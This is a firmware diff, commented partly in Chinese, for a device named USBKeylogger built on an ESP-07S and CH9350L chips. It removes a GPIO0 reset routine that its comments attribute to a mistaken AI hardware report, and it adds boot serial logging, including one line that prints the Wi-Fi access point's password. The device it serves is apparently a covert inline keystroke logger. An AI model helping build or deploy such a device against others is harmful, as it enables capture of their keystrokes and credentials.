@@ -33,10 +33,10 @@
 // LOG_SLOT_COUNT is ever increased past 9 slots.
 #define SLOT_PATH_SIZE 20
 
-// ESP-07S GPIO0 is wired to both CH9350L RST pins.  LOW = reset/config mode,
-// HIGH = normal operation.  Keep the pin high after the boot pulse so the
-// CH9350L bridges run normally (see USBKeylogger_Hardware_Report.md §3.2/§4.4).
-#define CH9350_RST_PIN 0
+// [FIX 2026-07] 修正:经核对 V1 实际原理图,ESP-07S 的 GPIO0(焊盘12)在板上为悬空(NC),
+// CH9350L 的 RST 引脚(第3脚)同样悬空,两者并未相连。此前"GPIO0 接 CH9350 RST"的说法
+// 来自一份有误的 AI 硬件报告,实际硬件上并不存在该连接。因此固件不应操作 GPIO0,
+// 启动时保持其默认状态即可(模块内部已上拉)。
 
 // =======Config=======
 const char* Version = "1.3.1";
@@ -181,7 +181,6 @@ bool hidReportLooksValid(const uint8_t* report);
 String templateProcessor(const String& var);
 void runOpenWifiProbe();
 void startArduinoOTA();
-void resetCH9350();
 
 static inline bool isLogAscii(uint8_t b) {
   return b == '\n' || b == '\r' || b == '\t' || (b >= 0x20 && b <= 0x7E);
@@ -442,14 +441,28 @@ bool writeConfigFile() {
   return LittleFS.rename(tmpPath, configFile_Path);
 }
 
+// [FIX 2026-07] 启动串口日志:原固件开机几乎不向串口输出任何信息,
+// 导致无法通过 TXD 判断固件是否运行。打开此开关后,可通过在 ESP-07S
+// TXD 焊盘(16脚)焊一根线接 USB-TTL 的 RX,用 115200 波特率观察启动过程。
+#define BOOT_DEBUG_SERIAL 1
+
+#if BOOT_DEBUG_SERIAL
+  #define BOOT_LOG(...)  do { Serial.printf(__VA_ARGS__); Serial.println(); } while (0)
+#else
+  #define BOOT_LOG(...)  do {} while (0)
+#endif
+
 void setup() {
   Serial.setRxBufferSize(512);
   Serial.begin(115200);
   Serial.setDebugOutput(false);
 
-  // Release / hold CH9350L in normal running mode.  The hardware ties RST to
-  // GPIO0, so a short LOW pulse resets both HID→UART and UART→HID chips.
-  resetCH9350();
+  // [FIX 2026-07] 已删除 resetCH9350() 的 GPIO0 脉冲操作:
+  // 实际硬件 GPIO0 未连接 CH9350 RST(见文件顶部修正说明),无需也不应操作。
+
+  BOOT_LOG("\n[BOOT] USBKeylogger %s starting...", Version);
+  BOOT_LOG("[BOOT] ChipID=%08X  Flash(real)=%u bytes  CPU=%uMHz",
+           ESP.getChipId(), ESP.getFlashChipRealSize(), ESP.getCpuFreqMHz());
 
   // Enable 8-second watchdog; loop() must not block longer than this.
   ESP.wdtEnable(WDTO_8S);
@@ -463,6 +476,7 @@ void setup() {
     }
   }
   LittleFS.info(fsInfo);
+  BOOT_LOG("[BOOT] LittleFS mounted: total=%u bytes", fsInfo.totalBytes);
   // Clean up stale temp file from interrupted config write
   if (LittleFS.exists("/config.tmp")) LittleFS.remove("/config.tmp");
 
@@ -564,6 +578,8 @@ void setup() {
   pushSessionID = randomHex(4);   // 8-char hex tag for this boot cycle
 
   startWiFi();
+  BOOT_LOG("[BOOT] WiFi AP started: SSID=%s  IP=%s",
+           cfg.AP_SSID.c_str(), WiFi.softAPIP().toString().c_str());
   startWebInterface();
   startArduinoOTA();
 
@@ -571,6 +587,8 @@ void setup() {
   if (MDNS.begin("usbkeylogger")) {
     MDNS.addService("http", "tcp", 80);
   }
+  BOOT_LOG("[BOOT] setup done. 手机搜索热点 %s 密码 %s",
+           cfg.AP_SSID.c_str(), cfg.AP_password.c_str());
 }
 
 void loop() {
@@ -1645,16 +1663,9 @@ void startWiFi(){
 }
 
 // ── ArduinoOTA (IDE / network firmware update) ────────────────────────────
-// Pulse GPIO0 LOW to reset both CH9350L chips, then leave it HIGH.
-void resetCH9350() {
-  pinMode(CH9350_RST_PIN, OUTPUT);
-  digitalWrite(CH9350_RST_PIN, HIGH);
-  delay(20);
-  digitalWrite(CH9350_RST_PIN, LOW);
-  delay(20);           // >= 10 ms per datasheet / hardware report
-  digitalWrite(CH9350_RST_PIN, HIGH);
-  delay(200);          // wait for CH9350L to come back up
-}
+// [FIX 2026-07] 原 resetCH9350() 已删除:实际硬件 GPIO0 并未连接 CH9350L 的
+// RST 引脚(V1 原理图中两者均悬空),该函数操作的是一个悬空引脚,属于基于错误
+// 硬件报告产生的无效代码。
 
 void startArduinoOTA() {
   ArduinoOTA.setHostname("USBKeylogger");
